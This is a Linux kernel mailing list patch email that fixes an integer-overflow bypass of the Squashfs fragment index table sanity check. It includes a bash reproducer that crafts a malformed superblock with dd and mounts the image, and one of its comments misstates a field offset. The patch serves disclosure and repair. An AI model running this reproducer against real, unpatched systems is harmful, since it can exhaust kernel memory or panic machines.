Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=188.121.53.12
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795571314;
	b=ZnninbaGuepEXugQ1oXAIkBfoWauJPiOVfeNRoBl1CWMmFyVEYzbyQ26PUJcCYRf0Gj/
	 CVA6FW5tJxdHxJ8v2GNcX1Ysvn591xpj1DYNgz8TeUzGX/NHtpcFjeH7hYaDMd+M05hMI
	 +d6VjfsRO2TomPXTKXDMqysQlXayKLp65d/QYOoYHM1yfl219KiBSgXZ1o7oyZjH/LSv2
	 FbA1FsA5FjB9zcUzslL3sLVgaxwaWIGuJ9UQ9ihngEvwXj3vhuvLylKeXqmJyEYxwGMvw
	 hKZmEHQiR+ni1d7JmdfEdZEr9zbvaporVjTsY+K/g+suYxr9clkVVCNNEec3IisCiOQ==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795571314;
	h=DMARC-Filter:Received:DKIM-Signature:DKIM-Signature:X-CMAE-Analysis:
	 Feedback-ID:X-SECURESERVER-ACCT:From:To:Cc:Subject:Date:Message-ID:
	 X-Mailer:In-Reply-To:References:MIME-Version:
	 Content-Transfer-Encoding:X-CMAE-Envelope;
	bh=5Ol4KRgIxC/Llch7EEqlhqbqeYoRCy5zPdztyjHj23I=;
	b=gz+zsjNPbJh+f5+XDjc5XRekM9BNs4mYKlN82cbvzFyYpF7PCQeREF2x/GwXFIl3gwL3
	 er3IhVOT2HwroBH0xEdSX7uufp9mErSs6hE0lRzbnRZyFTl/Gc4jwqIAxEjbxppa54Vc0
	 uTRV/TMFM8+9RTtxoaBfD7wHjgcwpaoRLmPmlaRjMTtVNVLyLJ0ddraWkGF5cIcGEuK1M
	 kYy9R3t3owZ30RfgikkLf5fOKRoggD91uzzA7ut96ytqttGWhgmAyHKaxlCieQZ74DPf3
	 bzN7nFeCaqdYRTnjcEi7ryigH+UryTTSRgYSjQD+nKwxiW9iXDNGxmuGer2hn56ZX2A==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=squashfs.org.uk;
	spf=pass smtp.mailfrom=squashfs.org.uk;
	dkim=pass header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=kDz5hefh;
	dkim=pass header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=Kuk3pH2K;
	arc=none smtp.remote-ip=188.121.53.12
Received: from sxplsmtpa04-02.prod.sxb1.secureserver.net (sxplsmtpa04-02.prod.sxb1.secureserver.net [188.121.53.12])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6B375606A690
	for <linux-kernel@vger.kernel.org>; Wed, 25 Nov 2026 01:48:33 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 6B375606A690
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=squashfs.org.uk
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=squashfs.org.uk
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=kDz5hefh;
	dkim=pass (2048-bit key, unprotected) header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=Kuk3pH2K
Received: from avalon.fritz.box ([82.69.79.175])
	by :SMTPAUTH: with ESMTPA
	id W26zxdCHW8H3GW27PxX8Na; Wed, 25 Nov 2026 01:48:19 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=secureserver.net;
	s=secureserver2; t=1795571300;
	bh=5Ol4KRgIxC/Llch7EEqlhqbqeYoRCy5zPdztyjHj23I=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References;
	b=kDz5hefhpwYh/tB5u+nCFQ9G6S0FafPehM3XPDIFoEymgbALT/nNrcz+UiRQXDau0
	 Y/GLnKWvn1E2jZpsYLAtAo96GH8x6Czi/lCw1BBXCvbop6qhL1WiFVPAqjXCWjtqgZ
	 uVpDljDFO7gF62dnWn1Y+spkXTQXypSmBjyFNZTjKH66KSJTDds4HQnvaSZceRB5Qy
	 nO0KH5rMlidCwgTFzSnn+vVAw3E25YhCbrcZN37pHQxNGNvRZGtwVHVHY7U+SaUjvw
	 Xe4hJZ4XLmI1AC7u4c5MV3OTp8A+8i5Xf/MWIW7Wg9jH4rppFnVxTzQxRJ4eqPFZgU
	 0J5wjXMfE8ZKA==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=squashfs.org.uk;
	s=secureserver1; t=1795571300;
	bh=5Ol4KRgIxC/Llch7EEqlhqbqeYoRCy5zPdztyjHj23I=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References;
	b=Kuk3pH2K0PGZVcav7h4TFRUvn9giNQXd9iqvunZlZ0Ne0njkKPI8xCnR3dADoH6Bk
	 5zNDDFdtAkBMqKhwX7sadAO1W7/i8gKSYVqY+KsOL4N0csWKkRMq1WqdczGemhM1Aj
	 M9ELP4pQbbTXGUZ/ki9vFo0H4cf/lfYCfACWm7oLYkXvPAf3MeO3Uz+9yPxspFbx/6
	 Gsccdu4TXwIjcGscHucBNzY4l9eCezYhDdPxvxQu0hYr8y76DiZsInSaANNgvZXsvD
	 3kvaflf5QuK8koiJBk7xFEelz+yPMnrULy8QZVYsH41AwUWmcFhde31smRlf6Z+JWo
	 j2sW/CH+Qa4mg==
X-CMAE-Analysis: v=2.4 cv=Cuoq4X4D c=1 sm=1 tr=0 ts=6b063e64
 a=84ok6UeoqCVsigPHarzEiQ==:117 a=84ok6UeoqCVsigPHarzEiQ==:17 a=FXvPX3liAAAA:8
 a=5M4-1oPrCebqpQMMblwA:9 a=UObqyxdv-6Yh2QiB9mM_:22
Feedback-ID: 63e6bd009b7ed2c0abb5673c4f3a8e20:squashfs.org.uk:ssnet
X-SECURESERVER-ACCT: phillip@squashfs.org.uk
From: Phillip Lougher <phillip@squashfs.org.uk>
To: akpm@linux-foundation.org,
	linux-kernel@vger.kernel.org
Cc: Phillip Lougher <phillip@squashfs.org.uk>
Subject: [PATCH v4 10/23] Squashfs: fix fragment index table length too large exploit
Date: Wed, 25 Nov 2026 01:47:24 +0000
Message-ID: <20261125014737.347231-11-phillip@squashfs.org.uk>
X-Mailer: git-send-email 2.47.3
In-Reply-To: <20261125014737.347231-1-phillip@squashfs.org.uk>
References: <20261125014737.347231-1-phillip@squashfs.org.uk>
X-Mailing-List: linux-kernel@vger.kernel.org
List-Id: <linux-kernel.vger.kernel.org>
List-Post: <mailto:linux-kernel@vger.kernel.org>
List-Help: <mailto:linux-kernel+help@vger.kernel.org>
List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-CMAE-Envelope: MS4xfMrFKUjc+hcm7jq0IhH0biB6eS1+q6zxUxJhBmsKgTVVVtBCyNjRcToTt36uLIaXjUI+UO3LsIU4WyXJQSQ9EVsBlUz8Mtah7IjtH7ADvnMqM9WkoKtb
 FENI8q6mCV3lEUsKLQiKcGf9M4semYTYkW0I/aMktThRhG4N/NAFwAgb0uqYdWeANzXOTH8e/PVpHpdvYE0aA1Yhfy5pVGhur5vB/sfW/gVpw585km5OhIwE
 fegNFt6rS5Bl2puQu4uRF2m2VNE8/Rmj1iNdTtyZ7AbAZ9IpjBJBb5/GR3Chl5zi

An attacker can manipulate the fragment count and the fragment table
start values in the superblock, and force the code to kmalloc()
a 4 Mbyte memory region, or try to allocate larger values which
will fail with a warning, and which will panic the kernel if panic on
warn is set.

If the allocation succeeds, these invalid values will be caught when the
code tries to read the data from disk, but, this leaves a small time
window where the 4 Mbyte block is allocated before being freed when
the mount of the filesystem fails.

The exploit relies on arithmetic overflow to evade the following sanity
check:

	if (fragment_table_start + length > next_table)

Specifically, the values of fragment_table_start and length can be
chosen so that they overflow an unsigned long long, and so appear less
than next_table.

Typically, the maximum memory that can be allocated with kmalloc() is
4 Mbytes.  So if length is 4 Mbytes, this means fragment_table_start
needs to be 2^64 - 4 Mbytes, to achieve overflow and produce a zero
length.

This value is beyond the end of any block device, because the maximum
block device is 2^63 - 512 in size (LLONG_MAX >> 9 sectors of 512
bytes).

In practice this means such a large value will be caught when the code
immediately after allocation tries to read the data off disk:

 	table = squashfs_read_table(sb, fragment_table_start, length);

However, the code should check for validity before allocating a large
kmalloc() area, because such allocations can cause memory pressure or
cause the kernel to panic.

This commit checks that fragment_tables_size is not too large, and
ensures arithmetic overflow does not occur.

It also makes the sanity check more exacting by utilising the fact that
there should be zero gap between the end of the fragment index table and
the next table.

Reproducer
=========

The following script if the eploit works, will fail with the mount
error

mount: attempt to access beyond end of device

=================================================================
#!/bin/bash

ARGS="-quiet -no-progress"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

# Create a Squashfs filesystem with a single file.
#
DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

echo Create the Squashfs filesystem

if ! mksquashfs - img.sqsh -p "/ d 0777 0 0" -p "/file f 0777 0 0 echo hello" $ARGS; then
	echo Failed to create Squashfs filesystem
	finish

fi

# The fragments field (fragment count) in the superblock is at offset
# 16 bytes.
#
# Over-write the fragments count with 268,435,456 little-endian.
# This will make the kernel try to kmalloc() 4 Mbytes to hold the
# fragment index table.
#

# Write 268,435,456 in little-endian format to file
/usr/bin/echo -en "\x00\x00\x00\x10" > file

# Over-write the fragments count in the superblock
echo Over-write the fragments count in the superblock

dd bs=1 seek=16 if=file of=img.sqsh count=4 conv=notrunc status=none

# The fragment table start (start of the index table) in the superblock
# is at offset 72 bytes.
#
# Over-write the value with 2^64 - 4 Mbytes little-endian.
# This value with the index table length will overflow an unsigned
# long long, giving the value 0.  This will evade the sanity check.

# Write 2^64 - 4 Mbytes in little-endian format to file
/usr/bin/echo -en "\x00\x00\xc0\xff\xff\xff\xff\xff" > file

# Over-write the fragment table start in the superblock
echo Over-write the fragment table start in the superblock

dd bs=1 seek=80 if=file of=img.sqsh count=8 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

# If the eploit works, the mount will fail with
# mount: attempt to access beyond end of device

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

popd 2>&1 > /dev/null

rm -rf $DIR
=================================================================

Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
---
 fs/squashfs/fragment.c | 8 ++++----
 1 file changed, 4 insertions(+), 4 deletions(-)

diff --git a/fs/squashfs/fragment.c b/fs/squashfs/fragment.c
index e945d045d55e..9f63e5b5c513 100644
--- a/fs/squashfs/fragment.c
+++ b/fs/squashfs/fragment.c
@@ -68,11 +68,11 @@ __le64 *squashfs_read_fragment_index_table(struct super_block *sb,
 	__le64 *table;
 
 	/*
-	 * Sanity check, length bytes should not extend into the next table -
-	 * this check also traps instances where fragment_table_start is
-	 * incorrectly larger than the next table start
+	 * The computed size of the index table (length bytes) should exactly
+	 * match the table start and end points
 	 */
-	if (fragment_table_start + length > next_table)
+	if (fragment_table_start >= next_table ||
+				length != (next_table - fragment_table_start))
 		return ERR_PTR(-EINVAL);
 
 	table = squashfs_read_table(sb, fragment_table_start, length);
-- 
2.47.3

